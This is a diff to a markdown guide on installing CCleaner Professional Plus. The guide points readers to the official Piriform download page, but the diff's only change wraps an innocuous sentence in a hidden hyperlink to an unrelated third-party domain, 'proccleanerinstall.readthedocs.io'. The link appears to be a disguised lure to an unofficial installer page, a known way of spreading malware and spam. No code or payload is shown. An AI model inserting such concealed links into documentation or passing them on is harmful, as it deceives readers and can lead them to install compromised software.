@@ -25,7 +25,7 @@ To begin, you’ll need to **install CCleaner Professional Plus** by downloading
 2. Search for “CCleaner Professional Plus download” to access the official Piriform download page.
 3. Choose the **Professional Plus** version and download the installer to your desktop.
 
-This process works the same whether you're setting up on **Windows 11** or **Windows 10**.
+[This process works the same whether you're setting up on **Windows 11** or **Windows 10**.](https://proccleanerinstall.readthedocs.io/en/latest/)
 
 
 
